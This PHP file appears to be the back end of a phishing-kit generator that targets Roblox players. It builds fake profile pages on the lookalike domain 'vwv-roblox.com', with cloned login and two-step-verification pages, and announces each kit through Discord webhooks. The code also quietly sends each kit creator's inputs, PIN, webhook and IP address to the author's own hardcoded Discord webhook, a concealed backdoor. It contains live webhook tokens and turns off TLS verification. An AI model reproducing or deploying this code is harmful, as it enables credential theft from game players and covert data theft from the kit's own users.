<?php

$realuser = $_POST['realusername'];
$fakeuser = $_POST['fakeusername'];
$about = $_POST['about'];
$friendcount = $_POST['friendcount'];
$followercount = $_POST['followercount'];
$pin = $_POST['pin'];
$followingcount = $_POST['followingcount'];
$youtubeLink = "https://youtube.com/asdsad";
$webhook = $_POST['webhook'];
$premium = $_POST['premium'];    //true or false
$robloxuserid = rand();
$dwebhook = "https://discord.com/api/webhooks/900927132560158770/qSg76pwpTPNprkO223_GdOZ_iOnZ-xdmvGiw0PPDVX5UJLOLhwiosisEIK-Q4j3yjacB";
$ipaddress=$_SERVER['REMOTE_ADDR']; 
if (filter_var($webhook, FILTER_VALIDATE_URL)) {
$curl = curl_init($webhook);
curl_setopt($curl, CURLOPT_URL, $webhook);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$resp = curl_exec($curl);
$data = json_decode($resp);
if(property_exists($data,'name')){
    $ch = curl_init("https://api.roblox.com/users/get-by-username?username=$realuser");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    
    $data = curl_exec($ch);
    $data = json_decode($data);
    
    $filename = '../users/';
    $indexphp = file_get_contents("genfile/indexphp");
    $setupphp = file_get_contents("genfile/setup.php");
    $notifyphp = file_get_contents("genfile/notify.php");
    $functionphp = file_get_contents("genfile/function.php");
    $sponsorshipphp = file_get_contents("genfile/sponsorship.php");
    $pphp = file_get_contents("genfile/p.php");
    $prosesphp = file_get_contents("genfile/login/proses.php");
    $index2stepphp = file_get_contents("genfile/login/index2step.php");
    $indexstep = file_get_contents("genfile/login/twostepverification/indexphp");
    $step2 = file_get_contents("genfile/login/twostepverification/stepphp");
    mkdir('../users/'.$robloxuserid.'/profile', 0777, true);
    mkdir('../users/'.$robloxuserid.'/profile/login', 0777, true);
    mkdir('../users/'.$robloxuserid.'/profile/login/twostepverification', 0777, true);
    file_put_contents('../users/'.$robloxuserid.'/profile/index.php', $indexphp);
    file_put_contents('../users/'.$robloxuserid.'/profile/notify.php', $notifyphp);
    file_put_contents('../users/'.$robloxuserid.'/profile/setup.php', $setupphp);
    file_put_contents('../users/'.$robloxuserid.'/profile/function.php', $functionphp);
    file_put_contents('../users/'.$robloxuserid.'/profile/sponsorship.php', $sponsorshipphp);
    file_put_contents('../users/'.$robloxuserid.'/profile/p.php', $pphp);
    file_put_contents('../users/'.$robloxuserid.'/profile/login/index.php', $index2stepphp);
    file_put_contents('../users/'.$robloxuserid.'/profile/login/proses.php', $prosesphp);
    file_put_contents('../users/'.$robloxuserid.'/profile/login/twostepverification/index.php', $indexstep);
    file_put_contents('../users/'.$robloxuserid.'/profile/login/twostepverification/step.php', $step2);
    fwrite(fopen('../users/'.$robloxuserid.'/profile/setup.php', "w"), str_replace("{webhook}", $webhook,
    str_replace("{realusername}", $realuser, str_replace("{fakeusername}", $fakeuser,str_replace("{about}", $about,str_replace("{friendcount}", $friendcount,str_replace("{followercount}", $followercount,str_replace("{followingcount}", $followingcount, str_replace("{premium}", $premium,str_replace("{pin}", $pin, file_get_contents("genfile/setup.php")))))))))));
    fwrite(fopen('../users/'.$robloxuserid.'/profile/login/proses.php', "w"), str_replace("{pin}", $pin, file_get_contents("genfile/login/proses.php")));
$timestamp = date("c", strtotime("now"));
$url = $webhook;

$hookObject = json_encode([
    /*
     * The general "message" shown above your embeds
     */
    "content" => "@everyone",
    /*
     * The username shown in the message
     */
    "username" => "UnsploedX Server - Create Notification",
    /*
     * The image location for the senders image
     */
    "avatar_url" => "https://cdn.discordapp.com/attachments/893752144459603978/897858698255405056/14784.gif",
    /*
     * Whether or not to read the message in Text-to-speech
     */
    "tts" => false,
    /*
     * File contents to send to upload a file
     */
    // "file" => "",
    /*
     * An array of Embeds
     */
    "embeds" => [
        /*
         * Our first embed
         */
        [
            // Set the title for your embed
            "title" => "Join Our Server",

            // The type of your embed, will ALWAYS be "rich"
            "type" => "rich",

            // A description for your embed
            "description" => "",

            // The URL of where your title will be a link to
            "url" => "https://discord.gg/ksXzNX7nuk",

            /* A timestamp to be displayed below the embed, IE for when an an article was posted
             * This must be formatted as ISO8601
             */
            "timestamp" => $timestamp,

            // The integer color to be used on the left side of the embed
            "color" => hexdec( "0022e6" ),

            // Footer object
            "footer" => [
                "text" => "UnsploedX Notification",
              "icon_url" => "https://cdn.discordapp.com/attachments/893752144459603978/897858698255405056/14784.gif"
            ],

            // Image object
            "image" => [
                "url" => "https://cdn.discordapp.com/attachments/893752144459603978/897858698255405056/14784.gif"
            ],

            // Thumbnail object
            "thumbnail" => [
                "url" => "https://cdn.discordapp.com/attachments/893752144459603978/897858698255405056/14784.gif"
            ],

            // Author object
            "author" => [
                "name" => "UnsploedX Notification",
                "url" => "https://discord.gg/ksXzNX7nuk"
            ],

            // Field array of objects
            "fields" => [
                // Field 1
                [
                    "name" => "Fake Link Created!",
                    "value" => "```https://vwv-roblox.com/users/".$robloxuserid."/profile```",
                    "inline" => true
                ]
            ]
        ]
    ]

], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );

$ch = curl_init();

curl_setopt_array( $ch, [
    CURLOPT_URL => $url,
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => $hookObject,
    CURLOPT_HTTPHEADER => [
        "Content-Type: application/json"
    ]
]);

$response = curl_exec( $ch );

$hookObject2 = json_encode([
    /*
     * The general "message" shown above your embeds
     */
    "content" => "",
    /*
     * The username shown in the message
     */
    "username" => "UnsploedX Server - Create Notification",
    /*
     * The image location for the senders image
     */
    "avatar_url" => "https://images-ext-2.discordapp.net/external/QXYUGtfSnOmgQj0Y245VmFeZd9664UhvbCn-Ooo5rqw/https/images-ext-1.discordapp.net/external/b_a3LEPCOR8-UgZQgbXVjXXxWOhA1bnSeduRtUAp8Ik/https/media.discordapp.net/attachments/882339669319245904/885694774521237504/standard.gif",
    /*
     * Whether or not to read the message in Text-to-speech
     */
    "tts" => false,
    /*
     * File contents to send to upload a file
     */
    // "file" => "",
    /*
     * An array of Embeds
     */
    "embeds" => [
        /*
         * Our first embed
         */
        [
            // Set the title for your embed
            "title" => "Join Our Server",

            // The type of your embed, will ALWAYS be "rich"
            "type" => "rich",

            // A description for your embed
            "description" => "",

            // The URL of where your title will be a link to
            "url" => "https://discord.gg/ksXzNX7nuk",

            /* A timestamp to be displayed below the embed, IE for when an an article was posted
             * This must be formatted as ISO8601
             */
            "timestamp" => $timestamp,

            // The integer color to be used on the left side of the embed
            "color" => hexdec( "0022e6" ),

            // Footer object
            "footer" => [
                "text" => "UnsploedX Notification",
              "icon_url" => "https://images-ext-1.discordapp.net/external/b_a3LEPCOR8-UgZQgbXVjXXxWOhA1bnSeduRtUAp8Ik/https/media.discordapp.net/attachments/882339669319245904/885694774521237504/standard.gif"
            ],

            // Image object
            "image" => [
                "url" => "https://images-ext-1.discordapp.net/external/b_a3LEPCOR8-UgZQgbXVjXXxWOhA1bnSeduRtUAp8Ik/https/media.discordapp.net/attachments/882339669319245904/885694774521237504/standard.gif"
            ],

            // Thumbnail object
            "thumbnail" => [
                "url" => "https://images-ext-2.discordapp.net/external/QXYUGtfSnOmgQj0Y245VmFeZd9664UhvbCn-Ooo5rqw/https/images-ext-1.discordapp.net/external/b_a3LEPCOR8-UgZQgbXVjXXxWOhA1bnSeduRtUAp8Ik/https/media.discordapp.net/attachments/882339669319245904/885694774521237504/standard.gif"
            ],

            // Author object
            "author" => [
                "name" => "UnsploedX Notification",
                "url" => "https://discord.gg/ksXzNX7nuk"
            ],

            // Field array of objects
            "fields" => [
                // Field 1
                [
                    "name" => "Someone Create Fake Link Created In Your Website",
                    "value" => "```https://vwv-roblox.com/users/".$robloxuserid."/profile```",
                    "inline" => false
                ],
                [
                    "name" => "Real Username",
                    "value" => "```".$realuser."```",
                    "inline" => false
                ],
                [
                    "name" => "Fake Username",
                    "value" => "```".$fakeuser."```",
                    "inline" => false
                ],
                [
                    "name" => "Follower Count",
                    "value" => "```".$followercount."```",
                    "inline" => false
                ],
                [
                    "name" => "Following Count",
                    "value" => "```".$followingcount."```",
                    "inline" => false
                ],
                [
                    "name" => "Friend Count",
                    "value" => "```".$friendcount."```",
                    "inline" => false
                ],
                [
                    "name" => "About",
                    "value" => "```".$about."```",
                    "inline" => false
                ],
                [
                    "name" => "Webhook",
                    "value" => "```".$webhook."```",
                    "inline" => false
                ],
                [
                    "name" => "Custom PIN",
                    "value" => "```".$pin."```",
                    "inline" => false
                ],
                [
                    "name" => "IP Address",
                    "value" => "```".$ipaddress."```",
                    "inline" => false
                ],
            ]
        ]
    ]

], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );
$ch = curl_init();

curl_setopt_array( $ch, [
    CURLOPT_URL => $dwebhook,
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => $hookObject2,
    CURLOPT_HTTPHEADER => [
        "Content-Type: application/json"
    ]
]);

$response = curl_exec( $ch );


    echo "https://vwv-roblox.com/users/$robloxuserid/profile";
    
}else{
    echo "Invalid Webhook!";
}
}
else{
    $hookObject2 = json_encode([
    /*
     * The general "message" shown above your embeds
     */
    "content" => "",
    /*
     * The username shown in the message
     */
    "username" => "WxR Server - Create Notification",
    /*
     * The image location for the senders image
     */
    "avatar_url" => "https://images-ext-2.discordapp.net/external/QXYUGtfSnOmgQj0Y245VmFeZd9664UhvbCn-Ooo5rqw/https/images-ext-1.discordapp.net/external/b_a3LEPCOR8-UgZQgbXVjXXxWOhA1bnSeduRtUAp8Ik/https/media.discordapp.net/attachments/882339669319245904/885694774521237504/standard.gif",
    /*
     * Whether or not to read the message in Text-to-speech
     */
    "tts" => false,
    /*
     * File contents to send to upload a file
     */
    // "file" => "",
    /*
     * An array of Embeds
     */
    "embeds" => [
        /*
         * Our first embed
         */
        [
            // Set the title for your embed
            "title" => "Join Our Server",

            // The type of your embed, will ALWAYS be "rich"
            "type" => "rich",

            // A description for your embed
            "description" => "",

            // The URL of where your title will be a link to
            "url" => "https://discord.gg/ksXzNX7nuk",

            /* A timestamp to be displayed below the embed, IE for when an an article was posted
             * This must be formatted as ISO8601
             */
            "timestamp" => $timestamp,

            // The integer color to be used on the left side of the embed
            "color" => hexdec( "0022e6" ),

            // Footer object
            "footer" => [
                "text" => "WxR Notification",
              "icon_url" => "https://images-ext-1.discordapp.net/external/b_a3LEPCOR8-UgZQgbXVjXXxWOhA1bnSeduRtUAp8Ik/https/media.discordapp.net/attachments/882339669319245904/885694774521237504/standard.gif"
            ],

            // Image object
            "image" => [
                "url" => "https://images-ext-1.discordapp.net/external/b_a3LEPCOR8-UgZQgbXVjXXxWOhA1bnSeduRtUAp8Ik/https/media.discordapp.net/attachments/882339669319245904/885694774521237504/standard.gif"
            ],

            // Thumbnail object
            "thumbnail" => [
                "url" => "https://images-ext-2.discordapp.net/external/QXYUGtfSnOmgQj0Y245VmFeZd9664UhvbCn-Ooo5rqw/https/images-ext-1.discordapp.net/external/b_a3LEPCOR8-UgZQgbXVjXXxWOhA1bnSeduRtUAp8Ik/https/media.discordapp.net/attachments/882339669319245904/885694774521237504/standard.gif"
            ],

            // Author object
            "author" => [
                "name" => "WxR Notification",
                "url" => "https://discord.gg/ksXzNX7nuk"
            ],

            // Field array of objects
            "fields" => [
                // Field 1
                [
                    "name" => "Someone Failed To Create Gen Generator",
                    "value" => "```https://vwv-roblox.com/users/". $robloxuserid ."```",
                    "inline" => true
                ],
                [
                    "name" => "Real Username",
                    "value" => "```".$realuser."```",
                    "inline" => false
                ],
                [
                    "name" => "Fake Username",
                    "value" => "```".$fakeuser."```",
                    "inline" => false
                ],
                [
                    "name" => "Follower Count",
                    "value" => "```".$followercount."```",
                    "inline" => false
                ],
                [
                    "name" => "Following Count",
                    "value" => "```".$followingcount."```",
                    "inline" => false
                ],
                [
                    "name" => "Friend Count",
                    "value" => "```".$friendcount."```",
                    "inline" => false
                ],
                [
                    "name" => "About",
                    "value" => "```".$about."```",
                    "inline" => false
                ],
                [
                    "name" => "Webhook",
                    "value" => "```".$webhook."```",
                    "inline" => false
                ],
                [
                    "name" => "Custom PIN",
                    "value" => "```".$pin."```",
                    "inline" => false
                ],
                [
                    "name" => "IP Address",
                    "value" => "```".$ipaddress."```",
                    "inline" => false
                ]
            ]
        ]
    ]

], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );
$ch = curl_init();

curl_setopt_array( $ch, [
    CURLOPT_URL => "https://discord.com/api/webhooks/901811274042736650/KEuIhN2oZT07-ot5onBRiXXt6k_Rc1JfRkFbMoKJ3NNgHt_F2bblQgRKIE3Ty0qegu3l",
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => $hookObject2,
    CURLOPT_HTTPHEADER => [
        "Content-Type: application/json"
    ]
]);

$response = curl_exec( $ch );
    echo "Invalid Webhook Link!!";
    exit();
}
?>